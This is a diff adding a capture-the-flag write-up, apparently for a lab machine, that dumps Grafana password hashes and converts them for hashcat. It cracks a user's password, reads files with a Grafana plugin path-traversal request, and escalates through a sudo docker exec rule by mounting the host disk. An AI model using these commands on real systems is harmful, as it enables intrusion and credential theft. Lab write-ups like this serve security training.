@@ -1321,3 +1321,355 @@ verbose     Tracing, logging etc
 ```
 
 Finally, after 20 minutes, I got the syntax right.
+
+```bash
+>  sqlite3 ~/grafana.db "SELECT id, login, email, password FROM user;"  
+╭────┬───────┬─────────────────┬──────────────────────────────────────────────────────────────────────────────────────────────────────╮  
+│ id │ login │      email      │                                               password                                               │  
+╞════╪═══════╪═════════════════╪══════════════════════════════════════════════════════════════════════════════════════════════════════╡  
+│  1 │ admin │ admin@localhost │ 7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8 │  
+│  2 │ boris │ boris@data.vl   │ dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8 │  
+╰────┴───────┴─────────────────┴──────────────────────────────────────────────────────────────────────────────────────────────────────╯
+```
+
+These gave me hashes for "admin" and "boris".
+
+Python script to decode their hashes :
+
+```python
+#!/usr/bin/env python3
+import base64
+import binascii
+import sys
+
+# Paste from sqlite output for ONE user:
+PASSWORD_HEX = "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
+SALT_STR = "PASTE_SALT_FROM_SQLITE"
+
+ITERATIONS = 10000
+
+raw = binascii.unhexlify(PASSWORD_HEX)
+hash_b64 = base64.b64encode(raw).decode()
+salt_b64 = base64.b64encode(SALT_STR.encode()).decode()
+
+print(f"sha256:{ITERATIONS}:{salt_b64}:{hash_b64}")
+```
+
+```bash
+>  python3 hashsqlite.py > hashboris.txt  
+>  cat hashboris.txt  
+sha256:10000:UEFTVEVfU0FMVF9GUk9NX1NRTElURQ==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
+
+# Modified the script to get the Admin's sha256 as well
+
+>  python3 hashsqlite.py > hashadmin.txt  
+>  cat hashadmin.txt  
+sha256:10000:UEFTVEVfU0FMVF9GUk9NX1NRTElURQ==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
+```
+
+This would take too much time, so I have to use the salt from the database and a more complex python script :
+
+```bash
+>  sqlite3 ~/grafana.db "SELECT login, password, salt FROM user;"  
+  
+╭───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────┬────────────╮  
+│ login │                                               password                                               │    salt    │  
+╞═══════╪══════════════════════════════════════════════════════════════════════════════════════════════════════╪════════════╡  
+│ admin │ 7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8 │ YObSoLj55S │  
+│ boris │ dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8 │ LCBhdtJWjl │  
+╰───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────┴────────────╯
+```
+
+```python
+"""Convert Grafana 8.x PBKDF2-HMAC-SHA256 hashes to Hashcat mode 10900."""
+
+  
+
+import base64
+
+import binascii
+
+import sys
+
+  
+
+ITERATIONS = 10000
+
+  
+
+USERS = {
+
+"admin": {
+
+"password_hex": (
+
+"7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322"
+
+"cf3723c92164b6172e9e73faf7a4c2072f8f8"
+
+),
+
+"salt": "YObSoLj55S",
+
+},
+
+"boris": {
+
+"password_hex": (
+
+"dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be"
+
+"220745be3cbe49353e35f53b51da8"
+
+),
+
+"salt": "LCBhdtJWjl",
+
+},
+
+}
+
+  
+  
+
+def to_hashcat(password_hex: str, salt: str) -> str:
+
+try:
+
+raw = binascii.unhexlify(password_hex)
+
+except (binascii.Error, ValueError) as e:
+
+raise SystemExit(f"Invalid password hex: {e}") from e
+
+  
+
+hash_b64 = base64.b64encode(raw).decode()
+
+salt_b64 = base64.b64encode(salt.encode()).decode()
+
+return f"sha256:{ITERATIONS}:{salt_b64}:{hash_b64}"
+
+  
+  
+
+def main() -> None:
+
+targets = sys.argv[1:] if len(sys.argv) > 1 else list(USERS.keys())
+
+  
+
+for login in targets:
+
+if login not in USERS:
+
+print(f"# unknown user: {login}", file=sys.stderr)
+
+continue
+
+row = USERS[login]
+
+print(f"# {login} salt={row['salt']}")
+
+print(to_hashcat(row["password_hex"], row["salt"]))
+
+  
+  
+
+if __name__ == "__main__":
+
+main()
+```
+
+```bash
+>  python3 hashsqlite.py > hashesgraf.txt
+>  cat hashesgraf.txt  
+# admin  salt=YObSoLj55S  
+sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=  
+# boris  salt=LCBhdtJWjl  
+sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
+```
+
+So we move to cracking :
+
+```bash
+>  hashcat -m 10900 hashesgraf.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
+hashcat (v7.1.2) starting  
+  
+OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
+======================================================================================================================================  
+* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
+  
+Minimum password length supported by kernel: 0  
+Maximum password length supported by kernel: 256  
+Minimum salt length supported by kernel: 0  
+Maximum salt length supported by kernel: 256  
+  
+Hashfile 'hashesgraf.txt' on line 1 (# admin  salt=YObSoLj55S): Separator unmatched  
+Hashfile 'hashesgraf.txt' on line 3 (# boris  salt=LCBhdtJWjl): Separator unmatched  
+Hashes: 2 digests; 2 unique digests, 2 unique salts  
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
+Rules: 1  
+  
+Optimizers applied:  
+* Zero-Byte  
+* Slow-Hash-SIMD-LOOP  
+  
+Watchdog: Temperature abort trigger set to 90c  
+  
+Host memory allocated for this attack: 514 MB (12574 MB free)  
+  
+Dictionary cache hit:  
+* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
+* Passwords.: 14344384  
+* Bytes.....: 139921497  
+* Keyspace..: 14344384  
+  
+sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
+```
+
+We got boris' password.
+
+```bash
+>  ssh boris@10.129.234.47  
+** WARNING: connection is not using a post-quantum key exchange algorithm.  
+** This session may be vulnerable to "store now, decrypt later" attacks.  
+** The server may need to be upgraded. See https://openssh.com/pq.html  
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)  
+  
+* Documentation:  https://help.ubuntu.com  
+* Management:     https://landscape.canonical.com  
+* Support:        https://ubuntu.com/pro  
+  
+ System information as of Thu May 21 09:42:06 UTC 2026  
+  
+ System load:  0.04              Processes:              207  
+ Usage of /:   38.6% of 4.78GB   Users logged in:        0  
+ Memory usage: 15%               IP address for eth0:    10.129.234.47  
+ Swap usage:   0%                IP address for docker0: 172.17.0.1  
+  
+  
+Expanded Security Maintenance for Infrastructure is not enabled.  
+  
+0 updates can be applied immediately.  
+  
+122 additional security updates can be applied with ESM Infra.  
+Learn more about enabling ESM Infra service for Ubuntu 18.04 at  
+https://ubuntu.com/18-04  
+  
+  
+Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62  
+boris@data:~$ ls  
+user.txt  
+boris@data:~$ cat user.txt  
+955e5bc886643723d43c7e7be11f5898
+```
+
+We got the user flag.
+
+```bash
+boris@data:~$ sudo -l  
+Matching Defaults entries for boris on localhost:  
+   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+  
+User boris may run the following commands on localhost:  
+   (root) NOPASSWD: /snap/bin/docker exec *
+```
+
+This is good news, that means we can execute docker with admin privileges to PrivEsc.
+
+```bash
+boris@data:~$ sudo /snap/bin/docker ps  
+[sudo] password for boris:    
+Sorry, user boris is not allowed to execute '/snap/bin/docker ps' as root on localhost.
+```
+
+So we try to find the hostname via traversal :
+
+```bash
+>  curl -s --path-as-is \  
+'http://data.htb:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname'  
+e6ff5b1cbc85
+```
+
+Back on boris :
+
+```bash
+boris@data:~$ sudo /snap/bin/docker exec -u root -it e6ff5b1cbc85 /bin/bash  
+bash-5.1# whoami  
+root  
+bash-5.1#
+bash-5.1# cd /  
+bash-5.1# ls  
+bin     dev     etc     home    lib     lib64   media   mnt     opt     proc    root    run     run.sh  sbin    srv     sys     tmp     usr     var
+```
+
+Since we are running on a container, we actually need to mount the root disk which is /dev/sdX
+
+```bash
+bash-5.1# mkdir /mnt/usb
+bash-5.1# mount /dev/sda1 /mnt
+bash-5.1# ls -la /mnt/root  
+total 36  
+drwx------    7 root     root          4096 May 21 07:23 .  
+drwxr-xr-x   23 root     root          4096 Jun  4  2025 ..  
+lrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -> /dev/null  
+drwx------    2 root     root          4096 Apr  9  2025 .cache  
+drwx------    3 root     root          4096 Apr  9  2025 .gnupg  
+drwxr-xr-x    3 root     root          4096 Jan 23  2022 .local  
+-rw-r--r--    1 root     root           148 Aug 17  2015 .profile  
+drwx------    2 root     root          4096 Jan 23  2022 .ssh  
+-rw-r-----    1 root     root            33 May 21 07:23 root.txt  
+drwxr-xr-x    4 root     root          4096 Jan 23  2022 snap
+```
+
+And, bingo.
+
+```bash
+bash-5.1# cat /mnt/root/root.txt  
+82cf16c035f14782c2ccab47060f04ca
+```
+
+First Linux Black Box finished and second Black Box engagement finished !
+
+Additional Deep Enumeration :
+
+```bash
+bash-5.1# id  
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)  
+bash-5.1# cat /etc/os-release  
+NAME="Alpine Linux"  
+ID=alpine  
+VERSION_ID=3.13.5  
+PRETTY_NAME="Alpine Linux v3.13"  
+HOME_URL="https://alpinelinux.org/"  
+BUG_REPORT_URL="https://bugs.alpinelinux.org/"  
+bash-5.1# cat /etc/issue  
+Welcome to Alpine Linux 3.13  
+Kernel \r on an \m (\l)  
+bash-5.1# find / -type f perm -4000 -o -perm -2000 2>/dev/null | head -20  
+bash-5.1# ls -la /etc/cron*  
+total 12  
+drwxr-xr-x    2 root     root          4096 Apr 14  2021 .  
+drwxr-xr-x    1 root     root          4096 Apr  9  2025 ..  
+-rw-------    1 root     root           283 Jun 19  2020 root
+bash-5.1# ls -la /var/spool/cron/crontabs  
+lrwxrwxrwx    1 root     root            13 Apr 14  2021 /var/spool/cron/crontabs -> /etc/crontabs
+5.4.0-1103-aws
+boris@data:~$ docker --version  
+Docker version 20.10.8, build 3967b7d28e
+boris@data:~$ getcap -r / 2>/dev/null  
+/usr/bin/mtr-packet = cap_net_raw+ep
+```
+
+Bonus : alternative way to decode the hashes without python
+
+```bash
+PASS_HEX="dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
+SALT="LCBhdtJWjl"
+HASH_B64=$(echo -n "$PASS_HEX" | xxd -r -p | base64 -w0)
+SALT_B64=$(echo -n "$SALT" | base64 -w0)
+echo "sha256:10000:${SALT_B64}:${HASH_B64}" > ~/hash-boris.txt 
+>  hashcat -m 10900 ~/hashboris.txt /usr/share/wordlists/rockyou.txt --show
+Sk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1 
+```
